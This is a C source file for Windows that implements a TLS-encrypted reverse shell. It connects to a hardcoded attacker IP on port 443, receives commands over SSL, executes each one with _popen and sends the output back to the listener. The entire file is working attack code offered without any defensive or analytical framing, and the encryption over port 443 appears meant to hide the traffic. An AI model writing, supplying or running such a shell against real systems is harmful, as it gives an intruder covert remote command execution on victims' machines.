#include <winsock2.h>
#include <windows.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>
#pragma comment(lib,"WS2_32")
#pragma comment (lib, "crypt32")
#pragma warning(disable:4996) 
WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;

void InitializeSSL()
{
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX* CreateSSLContext()
{
    const SSL_METHOD* method;
    SSL_CTX* ctx;

    method = TLS_client_method();  // Use TLS method for secure communication
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void CleanupSSL()
{
    EVP_cleanup();
}

int main() {
    // Initialize Winsock
    WSADATA wsaData;
    // listener ip, port on attacker's machine
    char* ATTACKER_IP = (char*)"192.168.100.10";
    short ATTACKER_PORT = 443;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Set up the sockaddr_in structure
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);

    // Connect to the attacker
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Initialize OpenSSL
    InitializeSSL();
    SSL_CTX* ctx = CreateSSLContext();

    // Create an SSL structure and attach it to the socket
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    // Perform the SSL handshake
    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    }
    else {
        printf("Connected with %s encryption\n", SSL_get_cipher(ssl));

        // Send and receive data through the SSL connection
        char command[1024];
        while (1) {
            // Receive command from the attacker
            int bytes = SSL_read(ssl, command, sizeof(command));
            if (bytes > 0) {
                command[bytes] = '\0';
                printf("Received command: %s\n", command);

                // Execute the command and capture the output
                FILE* fp = _popen(command, "r");
                if (fp == NULL) {
                    printf("Failed to run command\n");
                    break;
                }

                char result[1024];
                while (fgets(result, sizeof(result), fp) != NULL) {
                    // Send the result back to the attacker
                    SSL_write(ssl, result, strlen(result));
                }
                _pclose(fp);
            }
        }
    }

    // Clean up
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    CleanupSSL();
    WSACleanup();

    return 0;
}